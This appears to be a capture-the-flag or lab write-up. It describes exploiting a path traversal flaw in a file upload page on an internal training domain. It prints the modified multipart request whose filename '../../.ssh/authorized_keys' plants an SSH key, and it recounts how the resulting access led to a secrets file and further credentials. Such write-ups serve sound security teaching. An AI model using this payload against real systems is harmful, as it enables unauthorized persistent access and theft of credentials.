# Attack 5

## Background

This attack was performed on this [Dropbox page](https://dropbox.internal.regjeringen.uiaikt.no/).

This website was vulnerable to path traversal attack where it was possible to modify other files on the filesystem based on user input. The goal was to modify the *authorized_keys* file for SSH access.


## Solution

To perform this attack I could not modify the filename directly to traverse the directories as slashes are illegal characters in a file name. However by modifying the request using Burpsuite I could perform the attack. I first generated a public key and uploaded the public key file to the website. I then modified the relevant part of the request:
```HTTP
------WebKitFormBoundaryaKJVtrLUFihx8smB
Content-Disposition: form-data; name="file"; filename="../../.ssh/authorized_keys"
Content-Type: application/octet-stream

<public key>
------WebKitFormBoundaryaKJVtrLUFihx8smB--
```

This successfully uploaded the file to the correct path on the target host and allowed me to SSH into the system. Where I discovered a secret file at: `/home/ingrid.nilsen/level3_secrets.txt`.

This file contained the credentials for yet another [login page](https://state-secrets.internal.regjeringen.uiaikt.no/). Where I could download two binary files.